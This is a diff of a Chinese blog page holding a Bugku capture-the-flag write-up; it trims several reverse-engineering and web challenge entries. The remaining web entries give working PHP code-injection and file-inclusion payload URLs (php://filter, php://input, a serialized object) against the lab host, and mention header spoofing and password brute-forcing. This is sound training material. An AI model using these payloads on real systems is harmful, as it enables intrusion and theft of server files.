@@ -119,21 +119,20 @@
 
 
 
-  <meta name="description" content="逆向 入门逆向 把mov的数值表示成字符获得flag. Easy_vb VB_Decompiler打开看code获得flag(也可IDA看String窗口). Easy_Re IDA打开查看程序逻辑,发现把输入进行比较,比较对象为逆序的flag. 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. 逆向">
+  <meta name="description" content="逆向 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. WEB 本地包含 @$_REQUEST的意思是获得参数,包括@$_GET和@$_POST. 使用GET参数返回:Too Young Too Simple. 文件包含 http://123.206.87.240:8003/?hello=1);incl">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-bugku">
 <meta property="og:url" content="https://hitworld.github.io/posts/254aad4f/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="逆向 入门逆向 把mov的数值表示成字符获得flag. Easy_vb VB_Decompiler打开看code获得flag(也可IDA看String窗口). Easy_Re IDA打开查看程序逻辑,发现把输入进行比较,比较对象为逆序的flag. 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. 逆向">
+<meta property="og:description" content="逆向 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. WEB 本地包含 @$_REQUEST的意思是获得参数,包括@$_GET和@$_POST. 使用GET参数返回:Too Young Too Simple. 文件包含 http://123.206.87.240:8003/?hello=1);incl">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://hitworld.github.io/posts/254aad4f/1.png">
 <meta property="og:image" content="https://hitworld.github.io/posts/254aad4f/2.png">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.663Z">
+<meta property="og:updated_time" content="2020-08-26T03:15:05.520Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-bugku">
-<meta name="twitter:description" content="逆向 入门逆向 把mov的数值表示成字符获得flag. Easy_vb VB_Decompiler打开看code获得flag(也可IDA看String窗口). Easy_Re IDA打开查看程序逻辑,发现把输入进行比较,比较对象为逆序的flag. 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. 逆向">
-<meta name="twitter:image" content="https://hitworld.github.io/posts/254aad4f/1.png">
+<meta name="twitter:description" content="逆向 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. WEB 本地包含 @$_REQUEST的意思是获得参数,包括@$_GET和@$_POST. 使用GET参数返回:Too Young Too Simple. 文件包含 http://123.206.87.240:8003/?hello=1);incl">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/254aad4f/2.png">
 
 
 
@@ -499,7 +498,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.8k</span>
+                <span title="本文字数">2.1k</span>
               
 
               
@@ -513,7 +512,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">3 分钟</span>
+                <span title="阅读时长">2 分钟</span>
               
             </div>
           
@@ -534,35 +533,12 @@
 
       
         <h2 id="逆向">逆向</h2>
-<h3 id="入门逆向">入门逆向</h3>
-<p>把<code>mov</code>的数值表示成字符获得<code>flag</code>.</p>
-<h3 id="easy_vb">Easy_vb</h3>
-<p><code>VB_Decompiler</code>打开看<code>code</code>获得<code>flag</code>(也可<code>IDA</code>看<code>String</code>窗口).</p>
-<h3 id="easy_re">Easy_Re</h3>
-<p><code>IDA</code>打开查看程序逻辑,发现把输入进行比较,比较对象为逆序的<code>flag</code>.</p>
 <h3 id="游戏过关">游戏过关</h3>
 <p><code>OllyICE</code>打开通过关键字符串找到程序主逻辑,往下走找到<code>8</code>个比较,把所有<code>jmp</code>目标改变(不必要),输入获得<code>flag</code>.</p>
-<h3 id="逆向入门">逆向入门</h3>
-<p><code>IDA</code>打开发现是<code>binary</code>文件,<code>UTF-8</code>查看,发现是<code>Data URL</code>:类似<code>&lt;img src="{文件数据}"/&gt;</code>.</p>
-<p>新建<code>html</code>文件保存打开获得二维码,扫描得<code>flag</code>.</p>
 <h2 id="web">WEB</h2>
-<h3 id="web2">web2</h3>
-<p><code>F12</code>看源代码获得<code>flag</code>.</p>
-<h3 id="计算器">计算器</h3>
-<p><code>F12</code>改<code>minsize = "1"</code>为<code>minsize = "10"</code>获得<code>flag</code>.</p>
-<h3 id="web基础_get">web基础$_GET</h3>
-<p><code>http://123.206.87.240:8002/get/?what=flag</code>.</p>
-<h3 id="web基础_post">web基础$_POST</h3>
-<img src="/posts/254aad4f/1.png" title="Postman">
-<h3 id="矛盾">矛盾</h3>
-<p><code>PHP</code>数字与字符串弱相等<code>==</code>判定.</p>
-<p><code>http://123.206.87.240:8002/get/index1.php?num=1a</code>.</p>
-<h3 id="web3">web3</h3>
-<p><code>F12</code>,<code>js</code>最后面注释里有<code>html</code>编码,解出<code>flag</code>.</p>
-<h3 id="你必须让他停下">你必须让他停下</h3>
-<p>开抓包软件(<code>Fiddler</code>),第二个<code>response</code>获得<code>flag</code>.</p>
 <h3 id="本地包含">本地包含</h3>
-<p><code>@$_REQUEST</code>的意思是获得参数,包括<code>@$_GET</code>和<code>@$_POST</code>. 使用<code>GET</code>参数返回:<code>Too Young Too Simple</code>.</p>
+<p><code>@$_REQUEST</code>的意思是获得参数,包括<code>@$_GET</code>和<code>@$_POST</code>.</p>
+<p>使用<code>GET</code>参数返回:<code>Too Young Too Simple</code>.</p>
 <h4 id="文件包含">文件包含</h4>
 <p><code>http://123.206.87.240:8003/?hello=1);include%20$_GET[%27f%27];//&amp;f=php://filter/convert.base64-encode/resource=flag.php</code>.<code>Base64</code>解码即可.</p>
 <h4 id="命令执行">命令执行</h4>
@@ -570,11 +546,8 @@
 <h4 id="将flag.php文件读入变量">将flag.php文件读入变量</h4>
 <p><code>http://123.206.87.240:8003/?hello=file(%27flag.php%27)</code>.</p>
 <h3 id="变量1">变量1</h3>
-<p>匹配任意<code>\w</code>即<code>[A-Za-z0-9_]</code>的字符. <code>$$args</code>,使用全局变量<code>GLOBALS</code>即可.</p>
-<h3 id="web5">web5</h3>
-<p><code>F12</code>发现<code>JSFuck</code>,<code>console</code>运行获得<code>flag:ctf{whatfk}</code>. ...然而不行,看上面提示可知要大写.</p>
-<h3 id="头等舱">头等舱</h3>
-<p>抓包,看<code>response</code>的<code>header</code>获得<code>flag</code>.</p>
+<p>匹配任意<code>\w</code>即<code>[A-Za-z0-9_]</code>的字符.</p>
+<p><code>$$args</code>,使用全局变量<code>GLOBALS</code>即可.</p>
 <h3 id="welcome-to-bugkuctf">welcome to bugkuctf</h3>
 <p>第一步绕过,<code>php</code>可以使用<code>file_get_contents("php://input",'r')</code>读取<code>post</code>数据.</p>
 <img src="/posts/254aad4f/2.png" title="p2">
@@ -586,14 +559,10 @@
 <p><code>http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code>.</p>
 <h3 id="flag在index里">flag在index里</h3>
 <p>本地文件包含,<code>http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code>.解密得<code>flag</code>.</p>
-<h3 id="web4">web4</h3>
-<p>查看源代码,<code>URL</code>解码即可.</p>
 <h3 id="管理员系统">管理员系统</h3>
 <p>最下面有密码的<code>base64</code>值,通过<code>xff</code>头伪造本地登录.</p>
 <h3 id="网站被黑">网站被黑</h3>
 <p>扫目录发现<code>shell.php</code>.爆破密码获得<code>flag</code>.</p>
-<h3 id="输入密码查看flag">输入密码查看flag</h3>
-<p>爆破.</p>
 <h3 id="点击一百万次">点击一百万次</h3>
 <p>查看源代码,直接控制台<code>js</code>构造请求.</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> + <span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> + <span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br></pre></td></tr></table></figure>
@@ -724,7 +693,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -916,7 +885,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number">1.</span> <span class="nav-text">逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#入门逆向"><span class="nav-number">1.1.</span> <span class="nav-text">入门逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy_vb"><span class="nav-number">1.2.</span> <span class="nav-text">Easy_vb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy_re"><span class="nav-number">1.3.</span> <span class="nav-text">Easy_Re</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#游戏过关"><span class="nav-number">1.4.</span> <span class="nav-text">游戏过关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逆向入门"><span class="nav-number">1.5.</span> <span class="nav-text">逆向入门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-number">2.1.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算器"><span class="nav-number">2.2.</span> <span class="nav-text">计算器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web基础_get"><span class="nav-number">2.3.</span> <span class="nav-text">web基础$_GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web基础_post"><span class="nav-number">2.4.</span> <span class="nav-text">web基础$_POST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#矛盾"><span class="nav-number">2.5.</span> <span class="nav-text">矛盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web3"><span class="nav-number">2.6.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你必须让他停下"><span class="nav-number">2.7.</span> <span class="nav-text">你必须让他停下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地包含"><span class="nav-number">2.8.</span> <span class="nav-text">本地包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含"><span class="nav-number">2.8.1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">2.8.2.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将flag.php文件读入变量"><span class="nav-number">2.8.3.</span> <span class="nav-text">将flag.php文件读入变量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量1"><span class="nav-number">2.9.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web5"><span class="nav-number">2.10.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#头等舱"><span class="nav-number">2.11.</span> <span class="nav-text">头等舱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#welcome-to-bugkuctf"><span class="nav-number">2.12.</span> <span class="nav-text">welcome to bugkuctf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在index里"><span class="nav-number">2.13.</span> <span class="nav-text">flag在index里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web4"><span class="nav-number">2.14.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#管理员系统"><span class="nav-number">2.15.</span> <span class="nav-text">管理员系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网站被黑"><span class="nav-number">2.16.</span> <span class="nav-text">网站被黑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输入密码查看flag"><span class="nav-number">2.17.</span> <span class="nav-text">输入密码查看flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击一百万次"><span class="nav-number">2.18.</span> <span class="nav-text">点击一百万次</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">3.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extract变量覆盖"><span class="nav-number">3.1.</span> <span class="nav-text">extract变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcmp比较字符串"><span class="nav-number">3.2.</span> <span class="nav-text">strcmp比较字符串</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number">1.</span> <span class="nav-text">逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#游戏过关"><span class="nav-number">1.1.</span> <span class="nav-text">游戏过关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地包含"><span class="nav-number">2.1.</span> <span class="nav-text">本地包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含"><span class="nav-number">2.1.1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">2.1.2.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将flag.php文件读入变量"><span class="nav-number">2.1.3.</span> <span class="nav-text">将flag.php文件读入变量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量1"><span class="nav-number">2.2.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#welcome-to-bugkuctf"><span class="nav-number">2.3.</span> <span class="nav-text">welcome to bugkuctf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在index里"><span class="nav-number">2.4.</span> <span class="nav-text">flag在index里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#管理员系统"><span class="nav-number">2.5.</span> <span class="nav-text">管理员系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网站被黑"><span class="nav-number">2.6.</span> <span class="nav-text">网站被黑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击一百万次"><span class="nav-number">2.7.</span> <span class="nav-text">点击一百万次</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">3.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extract变量覆盖"><span class="nav-number">3.1.</span> <span class="nav-text">extract变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcmp比较字符串"><span class="nav-number">3.2.</span> <span class="nav-text">strcmp比较字符串</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -948,7 +917,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -957,7 +926,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
